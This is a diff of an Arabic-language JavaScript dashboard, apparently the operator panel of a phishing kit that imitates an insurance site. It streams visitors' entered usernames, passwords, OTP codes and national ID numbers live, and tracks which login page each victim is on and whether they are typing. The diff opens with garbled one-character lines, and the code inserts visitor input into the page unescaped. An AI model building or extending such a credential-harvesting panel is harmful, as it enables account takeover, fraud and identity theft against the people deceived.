- 
- 
- 
- 
- 
-h
-e
-a
-d
-e
-r
-S
-t
-a
-t
-s
-E
-l
-.
-a
-p
-p
-e
-n
-d
-C
-h
-i
-l
-d
-(
-d
-b
-)
-;
-
-
- 
- 
- 
- 
 }
-}
-
-function openTrashModal() {
-    let m = document.getElementById('trash-modal');
-    if (!m) {
-        m = document.createElement('div');
-        m.id = 'trash-modal';
-        m.className = 'fixed inset-0 z-[90] bg-black/40 flex items-center justify-center p-4';
-        m.innerHTML = `<div class="bg-white rounded-2xl shadow-2xl w-full max-w-lg max-h-[80vh] flex flex-col">
-            <div class="flex items-center justify-between p-4 border-b">
-                <h3 class="font-bold text-gray-800 text-sm"><i class="fa-solid fa-trash-can"></i> السلة — التسجيلات المحذوفة</h3>
-                <button id="trash-close" class="text-gray-400 hover:text-gray-700 text-lg">✕</button>
-            </div>
-            <div id="trash-list" class="flex-1 overflow-y-auto p-3 text-sm"></div>
-            <div class="p-3 border-t flex items-center justify-between gap-2">
-                <button id="restore-all" class="text-xs bg-blue-50 text-blue-600 px-3 py-2 rounded hover:bg-blue-100 font-bold">استعادة الكل</button>
-                <button id="empty-trash" class="text-xs bg-red-50 text-red-600 px-3 py-2 rounded hover:bg-red-100 font-bold">إفراغ السلة نهائيًا</button>
-            </div>
-        </div>`;
-        document.body.appendChild(m);
-        m.querySelector('#trash-close').onclick = () => m.classList.add('hidden');
-        m.addEventListener('click', (e) => { if (e.target === m) m.classList.add('hidden'); });
-        m.querySelector('#restore-all').onclick = async () => {
-            await sb.rpc('restore_all_trash');
-            await fetchVisitors(); updateStats(); renderUsersList(); renderTrashList();
-            window.showToast('تمت استعادة جميع التسجيلات');
-        };
-        m.querySelector('#empty-trash').onclick = async () => {
-            if (!window.confirm('حذف نهائي لكل محتويات السلة — لا يمكن التراجع. متابعة؟')) return;
-            const { data: n } = await sb.rpc('empty_trash');
-            await fetchVisitors(); updateStats(); renderUsersList(); renderTrashList();
-            window.showToast('أُفرغت السلة (' + (n ?? 0) + ' تسجيلًا)');
-        };
-    }
-    m.classList.remove('hidden');
-    renderTrashList();
-}
-
-function renderTrashList() {
-    const listEl = document.getElementById('trash-list');
-    if (!listEl) return;
-    const items = allUsersData.filter((u) => u.deleted);
-    if (!items.length) {
-        listEl.innerHTML = '<div class="text-center text-gray-400 text-xs py-8">السلة فارغة</div>';
-        return;
-    }
-    listEl.innerHTML = '';
-    items.forEach((u) => {
-        const row = document.createElement('div');
-        row.className = 'flex items-center justify-between p-2.5 border-b border-gray-100';
-        row.innerHTML = `<div>
-                <div class="font-bold text-gray-800 text-xs">${u.name}</div>
-                <div class="text-[10px] text-gray-400">${u.phone !== '—' ? u.phone + ' · ' : ''}حُذف ${timeAgo(u.deletedAt)}</div>
-            </div>`;
-        const btn = document.createElement('button');
-        btn.className = 'text-xs bg-blue-50 text-blue-600 px-2.5 py-1.5 rounded hover:bg-blue-100 font-bold';
-        btn.innerText = 'استعادة';
-        btn.onclick = async () => {
-            await sb.rpc('restore_visitor', { p_id: u.id });
-            await fetchVisitors(); updateStats(); renderUsersList(); renderTrashList();
-        };
-        row.appendChild(btn);
-        listEl.appendChild(row);
-    });
-}
-
 function setLive(state) {
     const badge = document.getElementById('live-badge');
     if (!badge) return;
-    if (state === 'ok') {
-        badge.className = 'text-xs bg-green-50 text-green-700 px-2 py-1 rounded-full font-bold';
-        badge.innerHTML = '<i class="fa-solid fa-bolt"></i> تحديث لحظي متصل';
-    } else if (state === 'err') {
-        badge.className = 'text-xs bg-red-50 text-red-600 px-2 py-1 rounded-full font-bold';
-        badge.innerHTML = '<i class="fa-solid fa-plug-circle-xmark"></i> انقطع الاتصال اللحظي';
-    } else {
-        badge.className = 'text-xs bg-gray-100 text-gray-500 px-2 py-1 rounded-full font-bold';
-        badge.innerHTML = '<i class="fa-solid fa-satellite-dish"></i> جاري الاتصال اللحظي';
-    }
+    if (state === 'ok') { badge.className = 'text-xs bg-green-50 text-green-700 px-2 py-1 rounded-full font-bold'; badge.innerHTML = '<i class="fa-solid fa-bolt"></i> تحديث لحظي متصل'; }
+    else if (state === 'err') { badge.className = 'text-xs bg-red-50 text-red-600 px-2 py-1 rounded-full font-bold'; badge.innerHTML = '<i class="fa-solid fa-plug-circle-xmark"></i> انقطع الاتصال اللحظي'; }
+    else { badge.className = 'text-xs bg-gray-100 text-gray-500 px-2 py-1 rounded-full font-bold'; badge.innerHTML = '<i class="fa-solid fa-satellite-dish"></i> جاري الاتصال اللحظي'; }
 }
-
-// --- date helpers -----------------------------------------------------------
-function toDate(value) {
-    if (!value) return null;
-    const d = new Date(value);
-    return isNaN(d.getTime()) ? null : d;
-}
-
-function isOnline(u) {
-    if (u.isOnlineFlag === false) return false;
-    const d = toDate(u.lastSeen);
-    return !!(d && (Date.now() - d.getTime()) < 90000);
-}
-
-const FIELD_LABELS = { username: 'اسم المستخدم', 'demo-username': 'اسم المستخدم', password: 'كلمة السر', 'demo-password': 'كلمة السر', otp: 'رمز التحقق', code: 'رمز التحقق', 'demo-civil-1': 'رقم الهوية (جزء 1)', 'demo-civil-2': 'رقم الهوية (جزء 2)', civil: 'رقم الهوية' };
-function fieldLabel(k) { return FIELD_LABELS[k] || k; }
-function fieldEntries(u) {
-    return Object.entries(u.fields || {}).filter(([k, v]) => v && String(v).trim() !== '');
-}
-function esc(s) { return String(s).replace(/[&<>"']/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]; }); }
-const PAGE_LABELS = [
-    [/customer-details/i, 'بيانات العميل'],
-    [/access-username/i, 'صفحة الدخول'],
-    [/access-password/i, 'كلمة المرور'],
-    [/access-verification/i, 'التحقق (OTP)'],
-    [/access-waiting/i, 'صفحة الانتظار'],
-    [/dashboard/i, 'لوحة المستخدم'],
-    [/becare/i, 'لوحة الإدارة'],
-    [/test/i, 'اختبار']
-];
-function pageLabel(p) {
-    if (!p) return 'الرئيسية';
-    for (const [re, label] of PAGE_LABELS) if (re.test(p)) return label;
-    const clean = p.replace(/\/+$/, '');
-    if (clean === '' || /index\.html$/i.test(clean)) return 'الرئيسية';
-    return clean;
-}
-
-function timeAgo(value) {
-    const d = toDate(value);
-    if (!d) return 'الآن';
-    const seconds = Math.floor((Date.now() - d.getTime()) / 1000);
-    if (seconds < 60) return `منذ ${Math.max(1, seconds)} ثانية`;
-    const minutes = Math.floor(seconds / 60);
-    if (minutes < 60) return `منذ ${minutes} دقيقة`;
-    const hours = Math.floor(minutes / 60);
-    if (hours < 24) return `منذ ${hours} ساعة`;
-    return `منذ ${Math.floor(hours / 24)} يوم`;
-}
-
-function formatDateTime(value) {
-    const d = toDate(value);
-    if (!d) return '';
-    const ampm = d.getHours() >= 12 ? 'pm' : 'am';
-    const h = d.getHours() % 12 || 12;
-    const m = d.getMinutes().toString().padStart(2, '0');
-    const day = d.getDate().toString().padStart(2, '0');
-    const month = (d.getMonth() + 1).toString().padStart(2, '0');
-    return `${ampm} ${h}:${m} | ${month}-${day}`;
-}
-
-// --- mapping -----------------------------------------------------------------
-function mapVisitor(row) {
-    const mapped = {
-        id: row.id,
-        visitorId: row.visitor_id,
-        name: (row.name && row.name.trim()) ? row.name.trim() : 'زائر',
-        idNumber: (row.civil_id && row.civil_id.trim()) ? row.civil_id : '—',
-        phone: (row.phone && row.phone.trim()) ? row.phone : '—',
-        docType: (row.doc_type && row.doc_type.trim()) ? row.doc_type : '—',
-        serial: (row.serial && row.serial.trim()) ? row.serial : '—',
-        insType: (row.ins_type && row.ins_type.trim()) ? row.ins_type : '—',
-        status: row.status || 'الرئيسية',
-        shortId: row.short_id || '————',
-        hasDetails: !!((row.phone && row.phone.trim()) || (row.civil_id && row.civil_id.trim()) || (row.name && row.name.trim()) || (row.fields && Object.keys(row.fields).length > 0)),
-        kind: 'form',
-        archived: !!row.archived,
-        createdAt: row.created_at,
-        lastSeen: row.last_seen,
-        isOnlineFlag: row.is_online !== false,
-        typing: row.is_typing === true,
-        deleted: !!row.deleted_at,
-        deletedAt: row.deleted_at,
-        page: row.page || '',
-        online: false
-    };
-    const F = mapped.fields || {};
-    mapped.username = F['demo-username'] || F['username'] || '';
-    const civilRaw = ((F['demo-civil-1'] || '') + (F['demo-civil-2'] || '') + (F['civilId'] || '') + (row.civil_id || '')).replace(/\D/g, '');
-    mapped.civilDisplay = civilRaw ? (civilRaw.length > 4 ? '\u2022\u2022\u2022\u2022' + civilRaw.slice(-4) : civilRaw) : '\u2014';
-    mapped.online = isOnline(mapped);
-    return mapped;
-}
-
-// --- filtering ----------------------------------------------------------------
-function getVisibleUsers() {
-    const term = (searchInput && searchInput.value ? searchInput.value : '').trim().toLowerCase();
-    return allUsersData.filter((u) => {
-        if (u.deleted) return false;
-        if (activeTab === 'inbox' && u.archived) return false;
-        if (activeTab === 'archive' && !u.archived) return false;
-        if (activeFilter === 'online' && !u.online) return false;
-        if (activeFilter === 'leads' && !u.hasDetails) return false;
-        if (!term) return true;
-        const haystack = [u.name, u.idNumber, u.phone, (u.phone || '').slice(-4), u.shortId, u.status, u.serial]
-            .filter(Boolean).join(' ').toLowerCase();
-        return haystack.includes(term);
-    });
-}
-
-// --- sidebar -------------------------------------------------------------------
-function renderUsersList() {
-    const users = getVisibleUsers();
-    usersListEl.innerHTML = '';
-
-    if (users.length === 0) {
-        usersListEl.innerHTML = `<div class="p-6 text-center text-gray-400 text-xs leading-6">
-            لا توجد زوار بعد.<br>افتح الموقع في تبويب آخر أو انتظر زيارة حقيقية —<br>ستظهر هنا لحظيًا دون تحديث الصفحة.
-        </div>`;
-        return;
-    }
-
-    users.forEach((user) => {
-        const isSelected = selectedUserId === user.id;
-        const activeClass = isSelected ? 'active-user' : 'border-r-4 border-transparent hover:bg-gray-50';
-
-        let bgAvatar = 'bg-gray-500';
-        if (user.online) bgAvatar = 'bg-green-600';
-        else if (user.status === 'insurance' || user.status === 'verify') bgAvatar = 'bg-green-600';
-        else if (user.status === 'compare') bgAvatar = 'bg-orange-500';
-        else if (user.status === 'الرئيسية') bgAvatar = 'bg-gray-600';
-
-        const item = document.createElement('div');
-        item.className = `flex justify-between p-3 border-b cursor-pointer transition ${activeClass}`;
-        item.onclick = () => selectUser(user.id);
-
-        item.innerHTML = `
-            <div class="flex items-start gap-3 w-full">
-                <div class="flex flex-col items-center gap-1 shrink-0">
-                    <div class="w-10 h-10 ${bgAvatar} text-white rounded-full flex items-center justify-center font-bold text-lg shadow-sm">
-                        <i class="fa-solid fa-user"></i>
-                    </div>
-                    <div class="flex items-center gap-1 text-[10px] text-gray-500">
-                        <span class="w-1.5 h-1.5 rounded-full ${user.online ? 'bg-green-500 animate-pulse' : 'bg-gray-300'}"></span> ${user.status || ''}
-                    </div>
-                    <div class="text-[10px] font-bold ${user.online ? 'text-green-600' : 'text-gray-400'}">${user.online ? '● متصل الآن' : '○ غير متصل · ' + timeAgo(user.lastSeen)}</div>
-                </div>
-
-                <div class="flex-1 min-w-0">
-                    <div class="flex justify-between items-start">
-                        <h4 class="font-bold text-sm text-gray-800 truncate pl-2">${user.name}</h4>
-                        <span class="text-[10px] text-gray-400 whitespace-nowrap">${timeAgo(user.createdAt)}</span>
-                    </div>
-                    <div class="mt-0.5 text-[11px] text-gray-500 flex items-center gap-2" dir="ltr">
-                        <span>${user.phone !== '—' ? user.phone : ''}</span>
-                    </div>
-                    <div class="mt-0.5 text-[10px] text-gray-400 flex items-center gap-1">
-                        <i class="fa-solid fa-location-dot"></i> يتواجد في: ${pageLabel(user.page)}
-                    </div>
-                        ${fieldEntries(user).length ? `<div class="mt-0.5 text-[10px] text-gray-600 bg-gray-50 rounded px-1.5 py-0.5 border" dir="auto">${fieldEntries(user).slice(0, 2).map(([k, v]) => `<span class="font-bold">${fieldLabel(k)}: ${v}</span>`).join(' · ')}</div>` : ''}
-
-                    ${fieldEntries(user).length ? `<div class="mt-0.5 text-[10px] text-gray-600 bg-gray-50 rounded px-1.5 py-0.5 border" dir="auto">${fieldEntries(user).slice(0, 2).map(([k, v]) => `<span class="font-bold">${fieldLabel(k)}: ${v}</span>`).join("·")}</div>` : ''}
-                    ${fieldEntries(user).length ? `<div class="mt-0.5 text-[10px] text-gray-600 bg-gray-50 rounded px-1.5 py-0.5 border" dir="auto">${fieldEntries(user).slice(0, 2).map(([k, v]) => `<span class="font-bold">${fieldLabel(k)}: ${v}</span>`).join(' \u00b7 ')}</div>` : ''}
-                    ${fieldEntries(user).length ? `<div class="mt-0.5 text-[10px] text-gray-600 bg-gray-50 rounded px-1.5 py-0.5 border" dir="auto">${fieldEntries(user).slice(0, 2).map(([k, v]) => `<span class="font-bold">${fieldLabel(k)}: ${v}</span>`).join(' · ')}</div>` : ''}
-                    ${user.typing && user.online ? `<div class="mt-0.5 text-[10px] text-orange-600 font-bold"><i class="fa-solid fa-pen fa-fade"></i> يكتب الآن</div>` : ''}
-                    ${isSelected ? `<div class="mt-1 flex items-center gap-2 text-xs text-gray-500">
-                        <span><i class="fa-solid fa-mobile-screen"></i> ${user.deviceInfo || ''}</span>
-                    </div>` : ''}
-                </div>
-                <div class="shrink-0 pt-1 text-gray-300">
-                    <i class="fa-regular ${isSelected ? 'fa-square-check text-green-500' : 'fa-square'}"></i>
-                </div>
-            </div>
-        `;
-        usersListEl.appendChild(item);
-    });
-}
-
-function updateStats() {
-    const active = allUsersData.filter((u) => !u.deleted);
-    const total = active.length;
-    const trashCount = allUsersData.length - active.length;
-    const trashBtn = document.getElementById('trash-btn');
-    if (trashBtn) trashBtn.innerHTML = `<i class="fa-solid fa-trash-can"></i> السلة (${trashCount})`;
-    const todayCount = active.filter((u) => {
-        const d = toDate(u.createdAt);
-        return d && (Date.now() - d.getTime()) < 86400000;
-    }).length;
-    const onlineCount = active.filter(isOnline).length;
-    const leadsCount = active.filter((u) => u.phone !== '—').length;
-
-    const todayEl = document.getElementById('stat-today');
-    const totalEl = document.getElementById('stat-total');
-    if (todayEl) todayEl.innerText = String(todayCount);
-    if (totalEl) totalEl.innerText = String(total);
-
-    const usersIconEl = document.getElementById('stat-online');
-    if (usersIconEl) usersIconEl.innerText = String(onlineCount);
-    const phoneEl = document.getElementById('stat-leads');
-    if (phoneEl) phoneEl.innerText = String(leadsCount);
-    const trioEl = document.getElementById('stat-trio');
-    if (trioEl) trioEl.innerHTML = `<span class="font-bold text-yellow-600">${onlineCount}</span> / <span class="font-bold text-green-600">${leadsCount}</span> / <span class="font-bold">${total}</span>`;
-
-    const inboxTab = tabButtons[0];
-    if (inboxTab) inboxTab.innerText = `صندوق الوارد (${active.filter(u => !u.archived).length})`;
-}
-
-// --- details ---------------------------------------------------------------------
-function selectUser(id) {
-    selectedUserId = id;
-    renderUsersList();
-
-    const user = allUsersData.find((u) => u.id === id);
-    if (!user) return;
-
-    noUserSelectedEl.classList.add('hidden');
-    userDetailsHeader.classList.remove('hidden');
-    userDetailsContent.classList.remove('hidden');
-
-    document.getElementById('detail-name').innerText = user.name;
-    document.getElementById('detail-id-short').innerHTML = `${user.shortId || '————'} <i class="fa-regular fa-copy cursor-pointer hover:text-green-600" onclick="window.copyToClipboard('${user.shortId || ''}')"></i>`;
-    document.getElementById('detail-phone').innerText = user.phone;
-    document.getElementById('detail-id').innerText = user.idNumber;
-    const pageEl = document.getElementById('detail-page');
-    if (pageEl) pageEl.innerHTML = '<i class="fa-solid fa-location-dot"></i> يتواجد في: ' + pageLabel(user.page);
-    const typingEl = document.getElementById('detail-typing');
-    if (typingEl) typingEl.classList.toggle('hidden', !(user.typing && user.online));
-
-    let fieldsBox = document.getElementById('detail-fields');
-    if (!fieldsBox) {
-        const anchor = document.getElementById('card-instype');
-        if (anchor) {
-            fieldsBox = document.createElement('div');
-            fieldsBox.id = 'detail-fields';
-            fieldsBox.className = 'border-t border-dashed border-gray-200 pt-3 mt-1 hidden';
-            anchor.closest('div.flex.justify-between').parentNode.appendChild(fieldsBox);
-        }
-    }
-    if (fieldsBox) {
-    
-        const entries = fieldEntries(user);
-        fieldsBox.classList.toggle('hidden', entries.length === 0);
-        fieldsBox.innerHTML = entries.length
-            ? '<div class="text-xs font-bold text-gray-500 mb-2">إدخالات الزائر من صفحات الموقع</div>' + entries.map(([k, v]) => `<div class="flex justify-between border-b border-dashed border-gray-200 pb-2 mb-2"><span class="text-gray-500 w-1/3">${fieldLabel(k)}:</span><span class="font-bold text-gray-900 w-2/3 text-left break-all" dir="auto">${v}</span></div>`).join('')
-            : '';
-    }
-
-    document.getElementById('card-name').innerText = user.name;
-    document.getElementById('card-id').innerText = user.idNumber;
-    document.getElementById('card-phone').innerText = user.phone;
-    document.getElementById('card-doctype').innerText = user.docType || '—';
-    document.getElementById('card-serial').innerText = user.serial || '—';
-    document.getElementById('card-instype').innerText = user.insType || '—';
-    const cuEl = document.getElementById('card-username');
-    if (cuEl) cuEl.innerText = user.username || '—';
-    const ccEl = document.getElementById('card-civil');
-    if (ccEl) ccEl.innerText = user.civilDisplay;
-
-
-    let journeyBox = document.getElementById('detail-journey');
-    if (!journeyBox) {
-        const anchor = document.getElementById('card-instype');
-        if (anchor) {
-            const wrap = anchor.closest('div.flex.justify-between');
-            if (wrap && wrap.parentNode) {
-                journeyBox = document.createElement('div');
-                journeyBox.id = 'detail-journey';
-                journeyBox.className = 'border-t border-dashed border-gray-200 pt-3 mt-3';
-                wrap.parentNode.appendChild(journeyBox);
-            }
-        }
-    }
-    if (journeyBox) {
-        const GROUPS = [
-            { page: /access-username/i,  title: 'صفحة الدخول',     keys: ['demo-username', 'username', 'demo-civil-1', 'demo-civil-2'] },
-            { page: /access-password/i,  title: 'كلمة المرور',     keys: ['demo-password', 'password'] },
-            { page: /access-verification/i, title: 'التحقق (OTP)', keys: ['otp', 'code'] },
-            { page: /customer-details/i, title: 'بيانات العميل',   keys: ['fullName', 'civilId', 'phone'] },
-            { page: /access-waiting/i,   title: 'صفحة الانتظار',   keys: [] }
-        ];
-        const f = user.fields || {};
-        let cards = '';
-        GROUPS.forEach((g) => {
-            const rows = g.keys.filter((k) => f[k] !== undefined && f[k] !== null && String(f[k]).trim() !== '')
-                .map((k) => '<div class="flex justify-between border-b border-dashed border-gray-100 pb-1.5 mb-1.5 last:mb-0">'
-                    + '<span class="text-gray-500 text-xs w-1/3">' + fieldLabel(k) + ':</span>'
-                    + '<span class="font-bold text-gray-900 text-xs w-2/3 text-left break-all" dir="auto">' + f[k] + '</span></div>')
-                .join('');
-            const onThis = new RegExp(g.page).test(user.page || '');
-            if (rows || onThis) {
-                cards += '<div class="rounded-xl border p-3 ' + (onThis ? 'border-green-300 bg-green-50/60' : 'border-gray-200 bg-white') + '">'
-                    + '<div class="flex items-center justify-between mb-2">'
-                    + '<span class="font-bold text-xs text-gray-700"><i class="fa-solid fa-file-lines"></i> ' + g.title + '</span>'
-                    + (onThis ? '<span class="text-[10px] bg-green-600 text-white px-2 py-0.5 rounded-full font-bold"><i class="fa-solid fa-location-dot"></i> الآن</span>' : '<span class="text-[10px] text-gray-400">مرّ منها</span>')
-                    + '</div>' + (rows || '<div class="text-[10px] text-gray-400">لم يُدخل بيانات هنا</div>') + '</div>';
-            }
-        });
-        journeyBox.classList.remove('hidden');
-        journeyBox.innerHTML = '<div class="text-xs font-bold text-gray-500 mb-2">رحلة الزائر عبر الصفحات — بيانات كل صفحة</div>'
-            + '<div class="grid gap-2">' + (cards || '<div class="text-[10px] text-gray-400">لا بيانات بعد</div>') + '</div>';
-    }
-
-    document.getElementById('detail-time').innerText = formatDateTime(user.lastSeen || user.createdAt);
-
-    const onlineEl = document.getElementById('detail-online');
-    if (onlineEl) {
-        onlineEl.innerText = user.online ? '● متصل الآن' : '○ غير متصل · آخر ظهور ' + timeAgo(user.lastSeen);
-        onlineEl.className = user.online
-            ? 'bg-green-50 text-green-700 border border-green-200 text-xs px-3 py-1 rounded font-bold'
-            : 'bg-gray-100 text-gray-500 border border-gray-200 text-xs px-3 py-1 rounded';
-    }
-}
-
-// --- data -------------------------------------------------------------------------
-async function fetchVisitors() {
-    const { data, error } = await sb.from('visitors')
-        .select('*')
-        .order('last_seen', { ascending: false })
-        .limit(500);
-    if (error) {
-        handleFetchError(error);
-        return false;
-    }
-    allUsersData = (data || []).map(mapVisitor);
-    return true;
-}
-
-function handleFetchError(error) {
-    const code = error.code || '';
-    const msg = error.message || '';
-    if (code === '42P01' || /does not exist/i.test(msg)) {
-        usersListEl.innerHTML = `<div class="p-5 text-center text-red-600 text-xs leading-6 bg-red-50 m-3 rounded-lg">
-            <b>الجدول غير موجود بعد.</b><br>
-            افتح Supabase → SQL Editor ونفّذ ملف <b>supabase_setup.sql</b><br>
-            ثم أعد تحميل هذه الصفحة.
-        </div>`;
-        window.showToast('نفّذ supabase_setup.sql في Supabase أولاً');
-    } else if (error.status === 401 || code === 'PGRST301') {
-        showLogin();
-    } else {
-        window.showToast('خطأ في جلب البيانات: ' + msg);
-    }
-}
-
-// --- realtime ------------------------------------------------------------------------
-function subscribeRealtime() {
-    if (liveChannel) sb.removeChannel(liveChannel);
-    liveChannel = sb.channel('visitors-live')
-        .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'visitors' }, (msg) => {
-            const u = mapVisitor(msg.new);
-            u.online = true;
-            if (!allUsersData.some((x) => x.id === u.id)) {
-                allUsersData.unshift(u);
-                updateStats();
-                renderUsersList();
-                window.showToast('زائر جديد دخل الآن: ' + u.name);
-            }
-        })
-        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'visitors' }, (msg) => {
-            const u = mapVisitor(msg.new);
-            const i = allUsersData.findIndex((x) => x.id === u.id);
-            if (i >= 0) allUsersData[i] = u; else allUsersData.unshift(u);
-            updateStats();
-            renderUsersList();
-            if (selectedUserId === u.id) selectUser(u.id);
-        })
-        .subscribe((status) => {
-            if (status === 'SUBSCRIBED') setLive('ok');
-            else if (status === 'CHANNEL_ERROR' || status === 'TIMED_OUT') setLive('err');
-            else setLive('wait');
-        });
-}
-
-// --- search / filters / tabs -----------------------------------------------------------
-if (searchInput) searchInput.addEventListener('input', renderUsersList);
-
-const FILTERS = ['all', 'online', 'leads'];
-filterPills.forEach((pill, index) => {
-    pill.addEventListener('click', () => {
-        activeFilter = FILTERS[index] || 'all';
-        filterPills.forEach((p, i) => {
-            p.className = (i === index)
-                ? 'bg-green-600 text-white px-3 py-1 rounded-full cursor-pointer'
-                : 'bg-gray-100 text-gray-600 px-3 py-1 rounded-full cursor-pointer hover:bg-gray-200';
-        });
-        renderUsersList();
-    });
-});
-
-tabButtons.forEach((btn, index) => {
-    btn.addEventListener('click', () => {
-        activeTab = index === 0 ? 'inbox' : 'archive';
-        tabButtons.forEach((b, i) => {
-            b.className = (i === index)
-                ? 'flex-1 py-3 text-green-600 bg-white border-b-2 border-green-500'
-                : 'flex-1 py-3 text-gray-500 hover:bg-gray-100 transition';
-        });
-        renderUsersList();
-    });
-});
-
-// --- global utilities --------------------------------------------------------------------
-window.copyToClipboard = function (textOrId) {
-    const el = document.getElementById(textOrId);
-    const textToCopy = el ? el.innerText.trim() : textOrId;
-    const textArea = document.createElement('textarea');
-    textArea.value = textToCopy;
-    textArea.style.position = 'fixed';
-    textArea.style.opacity = '0';
-    document.body.appendChild(textArea);
-    textArea.select();
-    const done = () => { textArea.remove(); window.showToast('تم النسخ!'); };
-    try {
-        if (navigator.clipboard && navigator.clipboard.writeText) {
-            navigator.clipboard.writeText(textToCopy).then(done).catch(() => { document.execCommand('copy'); done(); });
-        } else {
-            document.execCommand('copy');
-            done();
-        }
-    } catch (err) {
-        console.error('Failed to copy', err);
-        textArea.remove();
-    }
-};
-
-window.showToast = function (message) {
-    const toast = document.getElementById('toast');
-    if (!toast) return;
-    toast.innerText = message;
-    toast.classList.remove('translate-y-20', 'opacity-0');
-    setTimeout(() => toast.classList.add('translate-y-20', 'opacity-0'), 3000);
-};
-
-// --- boot ------------------------------------------------------------------------------------
 function renderIdleStats() {
-    headerStatsEl.innerHTML = `
-        <div class="flex items-center gap-2">
-            <span class="text-gray-500">اليوم</span>
-            <span class="font-bold text-gray-800" id="stat-today">0</span>
-        </div>
-        <div class="flex items-center gap-2 border-r pr-4">
-            <span class="text-gray-500">إجمالي</span>
-            <span class="font-bold text-gray-800" id="stat-total">0</span>
-        </div>
-        <div class="flex items-center gap-2 border-r pr-4 text-blue-600 font-bold">
-            <i class="fa-solid fa-users"></i> <span id="stat-online">0</span>
-        </div>
-        <div class="flex items-center gap-2 border-r pr-4 text-green-600 font-bold">
-            <i class="fa-solid fa-phone-volume"></i> <span id="stat-leads">0</span>
-        </div>
-        <div class="flex items-center gap-2 border-r pr-4">
-            <span class="text-gray-500">زوار</span>
-            <span id="stat-trio">0 / 0 / 0</span>
-        </div>`;
+    headerStatsEl.innerHTML = '<div class="flex items-center gap-2"><span class="text-gray-500">اليوم</span><span class="font-bold text-gray-800" id="stat-today">0</span></div>'
+        + '<div class="flex items-center gap-2 border-r pr-4"><span class="text-gray-500">إجمالي</span><span class="font-bold text-gray-800" id="stat-total">0</span></div>'
+        + '<div class="flex items-center gap-2 border-r pr-4 text-blue-600 font-bold"><i class="fa-solid fa-users"></i> <span id="stat-online">0</span></div>'
+        + '<div class="flex items-center gap-2 border-r pr-4 text-green-600 font-bold"><i class="fa-solid fa-phone-volume"></i> <span id="stat-leads">0</span></div>'
+        + '<div class="flex items-center gap-2 border-r pr-4"><span class="text-gray-500">زوار</span><span id="stat-trio">0 / 0 / 0</span></div>';
 }
 
-async function startApp() {
-    if (appStarted) return;
-    appStarted = true;
-    hideLogin();
-    renderIdleStats();
-    ensureHeaderControls();
-    const ok = await fetchVisitors();
-    if (ok) {
-        updateStats();
-        renderUsersList();
-        subscribeRealtime();
-        setInterval(async () => {
-            const okf = await fetchVisitors();
-            if (okf) {
-                allUsersData.forEach((u) => { u.online = isOnline(u); });
-                updateStats();
-                renderUsersList();
-                if (selectedUserId) selectUser(selectedUserId);
-            }
-        }, 30000);
-    }
-}
-
-sb.auth.onAuthStateChange((event, session) => {
-    if (event === 'SIGNED_IN' && session) startApp();
-    if (event === 'SIGNED_OUT') {
-        appStarted = false;
-        allUsersData = [];
-        selectedUserId = null;
-        if (liveChannel) { sb.removeChannel(liveChannel); liveChannel = null; }
-        setLive('wait');
-        showLogin();
-    }
-});
-
-(async function boot() {
-    noUserSelectedEl.classList.remove('hidden');
-    userDetailsHeader.classList.add('hidden');
-    userDetailsContent.classList.add('hidden');
-    ensureLoginGate();
-    const { data } = await sb.auth.getSession();
-    if (data && data.session) {
-        await startApp();
-    } else {
-        renderIdleStats();
-        showLogin();
-    }
-})();
-
-
-// --- database view: all records + all entries ---
 function openDbModal() {
     let m = document.getElementById('db-modal');
     if (!m) {
@@ -1426,10 +709,8 @@ function openDbModal() {
             + '<input id="db-search" type="text" placeholder="بحث…" class="border border-gray-200 rounded-lg px-3 py-1.5 text-xs w-40 focus:outline-none focus:ring-2 focus:ring-indigo-400">'
             + '<button id="db-refresh" class="text-xs bg-gray-100 text-gray-600 px-2.5 py-1.5 rounded hover:bg-gray-200 font-bold"><i class="fa-solid fa-rotate"></i> تحديث</button>'
             + '<button id="db-csv" class="text-xs bg-green-50 text-green-600 px-2.5 py-1.5 rounded hover:bg-green-100 font-bold"><i class="fa-solid fa-file-csv"></i> تصدير CSV</button>'
-            + '<button id="db-close" class="text-gray-400 hover:text-gray-700 text-lg">✕</button>'
-            + '</div></div>'
-            + '<div id="db-table-wrap" class="flex-1 overflow-auto p-3"></div>'
-            + '</div>';
+            + '<button id="db-close" class="text-gray-400 hover:text-gray-700 text-lg">✕</button></div></div>'
+            + '<div id="db-table-wrap" class="flex-1 overflow-auto p-3"></div></div>';
         document.body.appendChild(m);
         m.querySelector('#db-close').onclick = () => m.classList.add('hidden');
         m.addEventListener('click', (e) => { if (e.target === m) m.classList.add('hidden'); });
@@ -1440,29 +721,24 @@ function openDbModal() {
     m.classList.remove('hidden');
     renderDbTable();
 }
-
 function renderDbTable() {
     const wrap = document.getElementById('db-table-wrap');
     if (!wrap) return;
-    const q = (document.getElementById('db-search')?.value || '').trim().toLowerCase();
+    const qEl = document.getElementById('db-search');
+    const q = (qEl && qEl.value ? qEl.value : '').trim().toLowerCase();
     const rows = allUsersData.filter((u) => !u.deleted).filter((u) => {
         if (!q) return true;
-        const hay = [u.name, u.username, u.civilDisplay, u.phone, u.status, u.shortId, u.page]
-            .concat(fieldEntries(u).map(([k, v]) => k + ' ' + v)).join(' ').toLowerCase();
+        const hay = [u.name, u.username, u.civilDisplay, u.phone, u.status, u.shortId, u.page].concat(fieldEntries(u).map(([k, v]) => k + ' ' + v)).join(' ').toLowerCase();
         return hay.includes(q);
     });
     const countEl = document.getElementById('db-count');
     if (countEl) countEl.innerText = String(rows.length);
-    if (!rows.length) {
-        wrap.innerHTML = '<div class="text-center text-gray-400 text-xs py-10">لا توجد تسجيلات مطابقة</div>';
-        return;
-    }
+    if (!rows.length) { wrap.innerHTML = '<div class="text-center text-gray-400 text-xs py-10">لا توجد تسجيلات مطابقة</div>'; return; }
     const th = (t) => '<th class="p-2 text-right font-bold text-gray-600 whitespace-nowrap border-b-2 border-gray-200">' + t + '</th>';
-    let html = '<table class="w-full text-xs border-collapse">'
-        + '<thead class="sticky top-0 bg-white"><tr>'
+    let html = '<table class="w-full text-xs border-collapse"><thead class="sticky top-0 bg-white"><tr>'
         + th('الرمز') + th('الاسم') + th('اسم المستخدم') + th('آخر الهوية') + th('الجوال') + th('الحالة') + th('الموقع الحالي') + th('الاتصال') + th('آخر ظهور') + th('إدخالات الصفحات')
         + '</tr></thead><tbody>';
-    rows.forEach((u, i) => {
+    rows.forEach((u) => {
